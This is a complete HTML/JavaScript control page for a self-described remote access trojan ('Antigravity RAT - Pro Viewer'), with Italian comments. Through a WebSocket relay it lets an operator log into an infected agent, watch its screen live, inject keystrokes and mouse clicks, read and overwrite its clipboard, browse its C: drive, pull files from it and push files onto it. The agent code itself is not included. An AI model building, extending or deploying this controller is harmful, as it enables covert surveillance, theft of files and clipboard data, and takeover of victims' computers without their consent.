<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Antigravity Remote Viewer - Ultra Performance</title>
    <style>
        :root {
            --bg: #0d1117;
            --card-bg: #161b22;
            --accent: #58a6ff;
            --text: #c9d1d9;
            --danger: #f85149;
            --success: #3fb950;
        }

        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 1000px;
            background: var(--card-bg);
            border-radius: 12px;
            padding: 1.5rem;
            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
            text-align: center;
        }

        .status-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            background: #21262d;
            font-size: 0.8rem;
            margin-bottom: 1rem;
        }

        .status-dot {
            height: 10px; width: 10px;
            background-color: #8b949e;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
        }

        .connected .status-dot { background-color: var(--success); box-shadow: 0 0 10px var(--success); }

        .hidden { display: none !important; }

        input, select, textarea, button {
            font-family: inherit;
            background: #0d1117;
            border: 1px solid #30363d;
            color: white;
            padding: 8px;
            border-radius: 6px;
            margin-bottom: 10px;
            transition: 0.2s;
        }

        .btn-primary { background: var(--accent); border: none; font-weight: bold; cursor: pointer; width: 100%; padding: 12px; }
        .btn-primary:hover { opacity: 0.9; }
        
        #log {
            background: #010409;
            color: #7d8590;
            padding: 10px;
            border-radius: 6px;
            text-align: left;
            font-family: monospace;
            font-size: 0.75rem;
            max-height: 80px;
            overflow-y: auto;
            margin-top: 15px;
        }

        canvas {
            width: 100%;
            background: #000;
            border-radius: 8px;
            border: 1px solid #30363d;
            margin-top: 15px;
        }

        .control-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }

        .panel {
            background: rgba(0,0,0,0.2);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #30363d;
            text-align: left;
        }

        .panel label { display: block; font-size: 0.75rem; color: #8b949e; margin-bottom: 5px; }

        #explorer-container {
            margin-top: 15px;
            background: #0d1117;
            border-radius: 8px;
            max-height: 300px;
            overflow-y: auto;
            padding: 10px;
        }

        .file-item {
            display: flex;
            align-items: center;
            padding: 6px;
            border-bottom: 1px solid #21262d;
            cursor: pointer;
            font-size: 0.8rem;
        }

        .file-item:hover { background: rgba(88, 166, 255, 0.1); }
    </style>
</head>
<body>

    <div class="container">
        <h2 style="margin:0; color:var(--accent)">Antigravity RAT - Pro Viewer</h2>
        <div id="connection-status" class="status-badge">
            <span class="status-dot"></span> Disconnected
        </div>

        <!-- Login -->
        <div id="login-section">
            <input type="text" id="target-id" placeholder="Agent ID" style="width:200px">
            <input type="password" id="agent-password" placeholder="Password" style="width:200px">
            <button id="connect-btn" class="btn-primary" style="width:auto">Connect</button>
        </div>

        <div id="main-ui" class="hidden">
            <div class="control-grid">
                <!-- Video Controls -->
                <div class="panel">
                    <label>Performance Dashboard</label>
                    <div style="font-size: 1.5rem; font-weight: bold; color: var(--success);">
                        FPS: <span id="fps-counter">0</span>
                    </div>
                    <label style="margin-top:10px">Streaming Mode</label>
                    <select id="res-mode" style="width:100%">
                        <option value="performance">Speed Mode (480p - 240fps target)</option>
                        <option value="quality">High Quality (720p)</option>
                    </select>
                    <label>JPEG Quality (10-95)</label>
                    <input type="range" id="quality-range" min="10" max="95" value="40" style="width:100%">
                    <button id="stream-btn" class="btn-primary">Start Live Stream</button>
                </div>

                <!-- Clipboard & Files -->
                <div class="panel">
                    <label>Remote Clipboard</label>
                    <textarea id="clipboard-text" style="width:100%; height:40px; margin-bottom:5px"></textarea>
                    <div style="display:flex; gap:5px">
                        <button id="get-clip-btn" style="flex:1; font-size:0.7rem">Fetch</button>
                        <button id="set-clip-btn" style="flex:1; font-size:0.7rem">Set</button>
                    </div>
                    <label style="margin-top:10px">Upload File</label>
                    <input type="file" id="file-input" style="font-size:0.7rem; width:100%">
                    <button id="upload-btn" style="width:100%; font-size:0.7rem">Upload to Agent</button>
                </div>

                <!-- Downloads -->
                <div class="panel">
                    <label>Direct Download</label>
                    <input type="text" id="download-path" placeholder="C:\path\to\file.txt" style="width:100%">
                    <button id="download-btn" class="btn-primary" style="padding:5px">Download File</button>
                    
                    <div id="explorer-container">
                        <label>Remote Explorer: <span id="current-path" style="color:var(--accent)">C:\</span></label>
                        <div id="file-list"></div>
                    </div>
                </div>
            </div>

            <!-- Video Surface -->
            <canvas id="remote-screen"></canvas>
        </div>

        <div id="log">
            > Welcome to Antigravity RAT Console...<br>
        </div>
    </div>

    <script>
        const socketUrl = `ws://${window.location.host}`;
        let socket;
        let isStreaming = false;
        let currentPath = "C:\\";
        let frameCount = 0;
        let lastFPSUpdate = Date.now();

        const logEl = document.getElementById('log');
        const statusEl = document.getElementById('connection-status');
        const mainUI = document.getElementById('main-ui');
        const loginSection = document.getElementById('login-section');
        const canvas = document.getElementById('remote-screen');
        const ctx = canvas.getContext('2d');
        const fpsCounter = document.getElementById('fps-counter');

        function appendLog(msg) {
            logEl.innerHTML += `> ${msg}<br>`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        function initWebSocket() {
            socket = new WebSocket(socketUrl);
            socket.binaryType = 'blob';
            
            socket.onopen = () => {
                statusEl.classList.add('connected');
                statusEl.innerHTML = '<span class="status-dot"></span> Connected to Relay';
                appendLog("Connected to Relay Server.");
            };

            socket.onmessage = (event) => {
                if (event.data instanceof Blob) {
                    frameCount++;
                    const now = Date.now();
                    if (now - lastFPSUpdate >= 1000) {
                        fpsCounter.textContent = frameCount;
                        frameCount = 0;
                        lastFPSUpdate = now;
                    }

                    const url = URL.createObjectURL(event.data);
                    const img = new Image();
                    img.onload = () => {
                        canvas.width = img.width;
                        canvas.height = img.height;
                        ctx.drawImage(img, 0, 0);
                        URL.revokeObjectURL(url);
                    };
                    img.src = url;
                    return;
                }

                const data = JSON.parse(event.data);
                if (data.type === 'error') appendLog(`<span style="color:var(--danger)">${data.message}</span>`);
                else if (data.type === 'registered') {
                    appendLog("Authorized Access Granted.");
                    loginSection.classList.add('hidden');
                    mainUI.classList.remove('hidden');
                    // Stop preventivo per sicurezza
                    socket.send(JSON.stringify({ type: 'stop_stream' }));
                    requestDir(currentPath);
                } else if (data.type === 'file_list') renderFileList(data.path, data.items);
                else if (data.type === 'clipboard_data') document.getElementById('clipboard-text').value = data.content;
                else if (data.type === 'file_download') handleFileDownload(data);
                else if (data.type === 'chat') appendLog(`Agent: ${data.content}`);
            };
        }

        document.getElementById('connect-btn').onclick = () => {
            const id = document.getElementById('target-id').value;
            const pass = document.getElementById('agent-password').value;
            socket.send(JSON.stringify({ type: 'register', role: 'viewer', targetId: id, password: pass }));
        };

        document.getElementById('stream-btn').onclick = function() {
            isStreaming = !isStreaming;
            this.textContent = isStreaming ? 'Stop Stream' : 'Start Live Stream';
            this.style.background = isStreaming ? 'var(--danger)' : 'var(--accent)';
            
            if (isStreaming) {
                socket.send(JSON.stringify({ 
                    type: 'start_stream', 
                    quality: parseInt(document.getElementById('quality-range').value),
                    mode: document.getElementById('res-mode').value
                }));
            } else {
                socket.send(JSON.stringify({ type: 'stop_stream' }));
                // Pulisci il canvas e azzera FPS
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                fpsCounter.textContent = "0";
            }
        };

        // Inputs & Explorer
        function requestDir(path) {
            currentPath = path;
            document.getElementById('current-path').textContent = path;
            socket.send(JSON.stringify({ type: 'list_dir', path }));
        }

        function renderFileList(path, items) {
            const list = document.getElementById('file-list');
            list.innerHTML = '';
            if (path !== 'C:\\' && path !== 'C:/') {
                const back = document.createElement('div');
                back.className = 'file-item';
                back.innerHTML = '📁 .. (Back)';
                back.onclick = () => {
                    const parts = path.split(/[\\\/]/).filter(p => p !== '');
                    parts.pop();
                    let parent = parts.join('\\') + (parts.length === 1 ? '\\' : '');
                    if (parts.length === 0) parent = "C:\\";
                    requestDir(parent);
                };
                list.appendChild(back);
            }
            items.forEach(item => {
                const div = document.createElement('div');
                div.className = 'file-item';
                div.innerHTML = `${item.is_dir ? '📁' : '📄'} ${item.name}`;
                div.onclick = () => {
                    const fullPath = path.endsWith('\\') ? path + item.name : path + '\\' + item.name;
                    if (item.is_dir) requestDir(fullPath);
                    else document.getElementById('download-path').value = fullPath;
                };
                list.appendChild(div);
            });
        }

        // Clipboard
        document.getElementById('get-clip-btn').onclick = () => socket.send(JSON.stringify({ type: 'get_clipboard' }));
        document.getElementById('set-clip-btn').onclick = () => {
            socket.send(JSON.stringify({ type: 'set_clipboard', content: document.getElementById('clipboard-text').value }));
        };

        // Files
        document.getElementById('upload-btn').onclick = () => {
            const file = document.getElementById('file-input').files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = () => {
                socket.send(JSON.stringify({ type: 'file_transfer', filename: file.name, data: reader.result.split(',')[1] }));
            };
            reader.readAsDataURL(file);
        };
        document.getElementById('download-btn').onclick = () => {
            socket.send(JSON.stringify({ type: 'request_download', path: document.getElementById('download-path').value }));
        };

        function handleFileDownload(data) {
            const blob = b64toBlob(data.data);
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a'); a.href = url; a.download = data.filename; a.click();
            URL.revokeObjectURL(url);
        }

        function b64toBlob(b64Data) {
            const byteCharacters = atob(b64Data);
            const byteArrays = [];
            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
                const slice = byteCharacters.slice(offset, offset + 512);
                const byteNumbers = new Array(slice.length);
                for (let i = 0; i < slice.length; i++) byteNumbers[i] = slice.charCodeAt(i);
                byteArrays.push(new Uint8Array(byteNumbers));
            }
            return new Blob(byteArrays);
        }

        // Interaction
        window.addEventListener('keydown', (e) => { if (isStreaming) socket.send(JSON.stringify({ type: 'keyboard_event', key: e.key, code: e.code })); });
        canvas.addEventListener('mousedown', (e) => sendMouse('mousedown', e));
        canvas.addEventListener('mouseup', (e) => sendMouse('mouseup', e));
        canvas.addEventListener('mousemove', (e) => { if (e.buttons === 1) sendMouse('mousemove', e); });
        canvas.oncontextmenu = (e) => { e.preventDefault(); sendMouse('rightclick', e); };

        function sendMouse(action, e) {
            if (!isStreaming) return;
            const rect = canvas.getBoundingClientRect();
            const x = (e.clientX - rect.left) / rect.width;
            const y = (e.clientY - rect.top) / rect.height;
            socket.send(JSON.stringify({ type: 'mouse_event', action, x, y }));
        }

        initWebSocket();
    </script>
</body>
</html>
